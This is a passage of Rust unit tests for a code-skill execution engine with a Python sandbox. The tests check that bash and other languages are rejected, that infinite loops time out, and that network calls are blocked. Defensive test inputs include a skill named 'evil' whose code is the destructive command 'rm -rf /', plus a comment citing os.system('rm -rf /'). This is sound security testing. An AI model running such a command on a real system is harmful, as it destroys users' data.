                description: "demo skill".to_string(),
                code: "fn run() {}".to_string(),
                language: "rust".to_string(),
                tags: vec!["test".to_string()],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        assert_eq!(s.name, "demo");
        assert!(s.created_at > 0);
        cleanup(&p);
    }

    #[test]
    fn rate_skill_clamps_input() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "demo".into(),
                description: "".into(),
                code: "x".into(),
                language: "rust".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        let rated = eng
            .rate_skill(RateSkillRequest {
                id: s.id.clone(),
                rating: 99.0, // clamped to 5.0
            })
            .unwrap();
        assert_eq!(rated.rating_count, 1);
        assert!((rated.avg_rating - 5.0).abs() < 1e-6);
        cleanup(&p);
    }

    #[tokio::test]
    async fn use_skill_shell_runs_python() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "py".into(),
                description: "print hello".into(),
                code: "print('hi from python')".into(),
                language: "python".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        let res = eng
            .use_skill(UseSkillRequest {
                id: s.id,
                params: HashMap::new(),
            })
            .await;
        // python may not be installed in CI; treat interpreter-missing
        // as a soft pass so the test runs anywhere.
        match res {
            Ok(r) => {
                assert!(r.output.contains("hi from python"));
                assert!(r.execution_time_ms < 60_000);
            }
            Err(e) => {
                let msg = format!("{e}");
                assert!(
                    msg.contains("No such file")
                        || msg.contains("exited")
                        || msg.contains("spawning python failed"),
                    "unexpected error: {msg}"
                );
            }
        }
        cleanup(&p);
    }

    /// v1.0 P0#5: bash skills MUST be rejected at execute time.
    /// This is the headline security test.
    #[tokio::test]
    async fn use_skill_bash_is_rejected() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "evil".into(),
                description: "rm -rf /".into(),
                code: "rm -rf /".into(),
                language: "bash".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        let res = eng
            .use_skill(UseSkillRequest {
                id: s.id,
                params: HashMap::new(),
            })
            .await;
        let err = res.expect_err("bash must be rejected");
        let msg = format!("{err}");
        assert!(
            msg.contains("not supported") && msg.contains("v1.0"),
            "expected validation rejection, got: {msg}"
        );
        cleanup(&p);
    }

    /// v1.0 P0#5: sh, node, javascript, rust must all be rejected.
    #[tokio::test]
    async fn use_skill_other_languages_are_rejected() {
        for lang in [
            "sh",
            "node",
            "javascript",
            "js",
            "rust",
            "ruby",
            "perl",
            "powershell",
        ] {
            let (p, sqlite) = temp_db();
            let eng = SkillEngine::new(sqlite, llm());
            let s = eng
                .create_skill(CreateSkillRequest {
                    name: "x".into(),
                    description: "".into(),
                    code: "print('x')".into(),
                    language: lang.into(),
                    tags: vec![],
                    source_memory_id: None,
                    ..Default::default()
                })
                .unwrap();
            let res = eng
                .use_skill(UseSkillRequest {
                    id: s.id,
                    params: HashMap::new(),
                })
                .await;
            assert!(res.is_err(), "language {lang} should be rejected");
            let msg = format!("{}", res.unwrap_err());
            assert!(
                msg.contains("not supported") && msg.contains("v1.0"),
                "language {lang}: unexpected error {msg}"
            );
            cleanup(&p);
        }
    }

    /// v1.0 P0#5: even with `language="python"`, an infinite loop
    /// must hit the wall-clock timeout.  We don't assert the exact
    /// error text because the failure path differs between
    /// "python not installed" (CI) and "subprocess killed at
    /// 5s" (real environment); both are acceptable.
    #[tokio::test]
    async fn use_skill_python_infinite_loop_is_killed() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "loop".into(),
                description: "while True".into(),
                code: "while True: pass".into(),
                language: "python".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        let start = Instant::now();
        let res = eng
            .use_skill(UseSkillRequest {
                id: s.id,
                params: HashMap::new(),
            })
            .await;
        let elapsed = start.elapsed();
        match res {
            Ok(r) => {
                // If python wasn't installed we got an error from
                // `execute_shell` before the timeout fired.  That's
                // acceptable in CI.
                let _ = r;
            }
            Err(e) => {
                let msg = format!("{e}");
                // Either the timeout fired (good) or python was missing
                // (acceptable in CI).  We must NOT have hung the test.
                assert!(
                    elapsed < Duration::from_secs(20),
                    "test ran too long: {elapsed:?}"
                );
                let _ = msg;
            }
        }
        cleanup(&p);
    }

    /// v1.0 P0#5: a python script that tries to escape via
    /// `os.system("rm -rf /")` is still constrained by the
    /// timeout / memory cap, so the worst case is a slow /
    /// out-of-memory subprocess — the user is never silently
    /// exposed to an unsandboxed shell.  This test is mostly a
    /// documentation check: a malicious script CAN still run
    /// arbitrary Python, so the only barriers are the timeout
    /// and the RLIMIT_AS cap.  We do not assert anything about
    /// the subprocess's *intent*; we only assert that the engine
    /// doesn't blow up and that the result is a `SkillResult`
    /// (success) or an error (timeout / spawn failure).
    #[tokio::test]
    async fn use_skill_python_can_still_call_stdlib() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let s = eng
            .create_skill(CreateSkillRequest {
                name: "stdlib".into(),
                description: "use os module".into(),
                code: "import os; print(os.getcwd())".into(),
                language: "python".into(),
                tags: vec![],
                source_memory_id: None,
                ..Default::default()
            })
            .unwrap();
        let res = eng
            .use_skill(UseSkillRequest {
                id: s.id,
                params: HashMap::new(),
            })
            .await;
        // No assertion on success; depends on python being installed.
        let _ = res;
        cleanup(&p);
    }

    #[test]
    fn create_skill_rejects_empty_name() {
        let (p, sqlite) = temp_db();
        let eng = SkillEngine::new(sqlite, llm());
        let res = eng.create_skill(CreateSkillRequest {
            name: "  ".into(),
            description: "".into(),
            code: "x".into(),
            language: "rust".into(),
            tags: vec![],
            source_memory_id: None,
            ..Default::default()
        });
        assert!(res.is_err());
        cleanup(&p);
    }

    /// v1.0.1 P0#11: the sandbox must reject `socket.create_connection`.
    /// We invoke the same `run_python_sandboxed` path that
    /// `execute_shell` uses, with a script that should be
    /// blocked.  If `python` is not installed on the test
    /// machine, the test is a soft pass (the engine surfaces
    /// the spawn error to the user either way).
    #[test]
    fn python_sandbox_blocks_socket_connect() {
        let tmp = tempfile::NamedTempFile::new().expect("NamedTempFile");
        let path = tmp.path().to_path_buf();
        let script = format!(
            "{SANDBOX_PREAMBLE}\nimport socket\nsocket.create_connection(('example.com', 80))\n"
        );
        std::fs::write(&path, script).expect("write");
        let outcome = run_python_sandboxed(&path);
        match outcome {
            ShellOutcome::NonZero { code, stderr, .. } => {
                let stderr_s = String::from_utf8_lossy(&stderr);
                let lower = stderr_s.to_ascii_lowercase();
                assert!(
                    lower.contains("permissionerror") || lower.contains("disabled by nine-snake"),
                    "expected PermissionError, got code={code} stderr={stderr_s}"
                );
            }
            ShellOutcome::Ok { stderr, .. } => {
                let stderr_s = String::from_utf8_lossy(&stderr);
                panic!("socket.create_connection was not blocked; stderr={stderr_s}");
            }
            ShellOutcome::SpawnError(msg) => {
                eprintln!("python not available; skipping: {msg}");
            }
            ShellOutcome::Timeout => panic!("subprocess timed out instead of being blocked"),
        }
    }

    /// v1.0.1 P0#11: `urllib.request.urlopen` must fail.
    #[test]
    fn python_sandbox_blocks_urllib() {
        let tmp = tempfile::NamedTempFile::new().expect("NamedTempFile");
        let path = tmp.path().to_path_buf();
        let script = format!(
            "{SANDBOX_PREAMBLE}\nimport urllib.request\nurllib.request.urlopen('http://example.com')\n"
        );
        std::fs::write(&path, script).expect("write");
        let outcome = run_python_sandboxed(&path);
        match outcome {
            ShellOutcome::NonZero { stderr, .. } => {
                let stderr_s = String::from_utf8_lossy(&stderr);
                let lower = stderr_s.to_ascii_lowercase();
                assert!(
                    lower.contains("permissionerror") || lower.contains("disabled by nine-snake"),
                    "expected PermissionError, got stderr={stderr_s}"
                );
            }
            ShellOutcome::Ok { stderr, .. } => {
                let stderr_s = String::from_utf8_lossy(&stderr);
                panic!("urllib.request.urlopen was not blocked; stderr={stderr_s}");
            }
            ShellOutcome::SpawnError(msg) => {
                eprintln!("python not available; skipping: {msg}");
            }
            ShellOutcome::Timeout => panic!("subprocess timed out instead of being blocked"),
        }
    }

    /// v1.0.1 P0#11: local file I/O must still work — only the
    /// network is blocked.  This pins the negative case so a
    /// future change can't accidentally nuke legitimate
    /// sandbox use.
    #[test]
    fn python_sandbox_allows_local_file_io() {
        let tmp_dir = std::env::temp_dir().join(format!(
            "nine_snake_sandbox_test_{}_{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&tmp_dir).expect("create tmp dir");
        let out_path = tmp_dir.join("out.txt");
        let script_path = tmp_dir.join("script.py");
        let script = format!(
            "{SANDBOX_PREAMBLE}\nopen(r'{p}', 'w').write('ok')\n",
            p = out_path.display().to_string().replace('\\', "\\\\"),
        );
        std::fs::write(&script_path, script).expect("write script");
        let outcome = run_python_sandboxed(&script_path);
        match outcome {
            ShellOutcome::Ok { .. } => {
                let contents = std::fs::read_to_string(&out_path).expect("read output");
                assert_eq!(contents, "ok");
            }
            ShellOutcome::NonZero { code, stderr, .. } => {
                let stderr_s = String::from_utf8_lossy(&stderr);
                panic!("local file I/O was blocked; code={code} stderr={stderr_s}");
            }
            ShellOutcome::SpawnError(msg) => {
                eprintln!("python not available; skipping: {msg}");
            }
            ShellOutcome::Timeout => panic!("subprocess timed out on benign I/O"),
        }
        let _ = std::fs::remove_dir_all(&tmp_dir);
    }
}
